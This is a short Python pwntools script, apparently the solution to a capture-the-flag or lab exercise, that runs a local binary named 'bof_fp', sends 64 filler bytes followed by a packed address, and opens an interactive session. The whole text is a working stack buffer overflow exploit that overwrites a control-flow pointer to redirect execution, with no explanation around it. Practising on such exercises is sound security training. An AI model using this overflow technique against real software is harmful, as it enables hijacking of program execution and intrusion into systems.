from pwn import *
p = process('./bof_fp')

print p.recv()
p.send('A'*64+p32(0x804854b))
p.interactive()
